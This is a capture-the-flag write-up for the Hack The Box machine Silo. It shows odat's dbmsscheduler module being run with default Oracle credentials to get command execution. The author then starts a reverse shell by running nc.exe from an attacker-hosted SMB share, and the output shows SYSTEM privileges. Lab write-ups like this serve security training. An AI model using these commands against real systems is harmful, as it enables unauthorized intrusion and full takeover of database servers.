# Unintended path to exploitation/SYSTEM

I used the odat binary but the Python script should work just as well. Let's test if we have RCE with dbmsscheduler module, I tried the Java one and it didn't work.

```text
root@kali:~/CTF/HTB/Silo# /opt/odat-libc2.12-x86_64/odat-libc2.12-x86_64 dbmsscheduler -s 10.10.10.82 -U scott -P tiger -d XE --sysdba --test-module
[1] (10.10.10.82:1521): Test if the DBMSScheduler library can be used
[1.1] DBMSSCHEDULER library ?
[+] OK
```

The chart of privileges is [shown here](https://github.com/quentinhardy/odat). Since it says OK above, let's try to ping the attacker.

```text
root@kali:~/CTF/HTB/Silo# /opt/odat-libc2.12-x86_64/odat-libc2.12-x86_64 dbmsscheduler -s 10.10.10.82 -U scott -P tiger -d XE --sysdba --exec "C:\Windows\system32\ping.exe 10.10.14.78"

[1] (10.10.10.82:1521): Execute the `C:\Windows\system32\ping.exe 10.10.14.78` on the 10.10.10.82 server
[+] The `C:\Windows\system32\ping.exe 10.10.14.78` command was executed on the 10.10.10.82 server
[+] The Job is running

root@kali:~/CTF/HTB/Silo# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
18:34:07.952768 IP silo.htb > 10.10.14.78: ICMP echo request, id 1, seq 1, length 40
18:34:07.952858 IP 10.10.14.78 > silo.htb: ICMP echo reply, id 1, seq 1, length 40
18:34:08.959399 IP silo.htb > 10.10.14.78: ICMP echo request, id 1, seq 2, length 40
18:34:08.959516 IP 10.10.14.78 > silo.htb: ICMP echo reply, id 1, seq 2, length 40
18:34:10.036004 IP silo.htb > 10.10.14.78: ICMP echo request, id 1, seq 3, length 40
18:34:10.036052 IP 10.10.14.78 > silo.htb: ICMP echo reply, id 1, seq 3, length 40
18:34:11.059302 IP silo.htb > 10.10.14.78: ICMP echo request, id 1, seq 4, length 40
18:34:11.059334 IP 10.10.14.78 > silo.htb: ICMP echo reply, id 1, seq 4, length 40
```

Note I had to specify the full path to the program. Now we can host an unauthenticated SMB share and then run nc.exe on that share to connect back.

```text
root@kali:~/CTF/HTB/Silo# impacket-smbserver kali .
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

root@kali:~/CTF/HTB/Silo# /opt/odat-libc2.12-x86_64/odat-libc2.12-x86_64 dbmsscheduler -s 10.10.10.82 -U scott -P tiger -d XE --sysdba --exec "\\\10.10.14.78\\kali\\nc.exe 10.10.14.78 443 -e cmd.exe"

[1] (10.10.10.82:1521): Execute the `\\10.10.14.78\kali\nc.exe 10.10.14.78 443 -e cmd.exe` on the 10.10.10.82 server
[+] The `\\10.10.14.78\kali\nc.exe 10.10.14.78 443 -e cmd.exe` command was executed on the 10.10.10.82 server
[+] The Job is running

root@kali:~/CTF/HTB/Silo# rlwrap -r nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.78] from (UNKNOWN) [10.10.10.82] 49167
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\oraclexe\app\oracle\product\11.2.0\server\DATABASE>
```

The strange thing here is commands don't work as though the PATH is not set.

```text
C:\oraclexe\app\oracle\product\11.2.0\server\DATABASE>systeminfo
systeminfo
'systeminfo' is not recognized as an internal or external command,
operable program or batch file.

C:\oraclexe\app\oracle\product\11.2.0\server\DATABASE>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Phineas\Desktop>set
set
logProperty=false
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.JS;.WS;.MSC
PROMPT=$P$G
SystemDrive=C:
SystemRoot=C:\Windows
WinDir=C:\Windows
ComSpec=C:\Windows\system32\cmd.exe
ProgramFiles=C:\Program Files
OS=Windows_NT
```

But when we run the full path to command it's quite clear we are SYSTEM since Oracle DB runs as SYSTEM.

```text
C:\Users\Phineas\Desktop>C:\Windows\system32\whoami.exe
C:\Windows\system32\whoami.exe
nt authority\system

C:\Users\Phineas\Desktop>C:\Windows\system32\whoami.exe /all
C:\Windows\system32\whoami.exe /all

USER INFORMATION
----------------

User Name           SID
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
Mandatory Label\System Mandatory Level Label            S-1-16-16384


PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State
=============================== ========================================= ========
SeAssignPrimaryTokenPrivilege   Replace a process level token             Disabled
SeLockMemoryPrivilege           Lock pages in memory                      Enabled
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeTcbPrivilege                  Act as part of the operating system       Enabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Enabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Enabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled
SeCreatePagefilePrivilege       Create a pagefile                         Enabled
SeCreatePermanentPrivilege      Create permanent shared objects           Enabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled
SeAuditPrivilege                Generate security audits                  Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled
SeTimeZonePrivilege             Change the time zone                      Enabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled

ERROR: Unable to get user claims information.
```

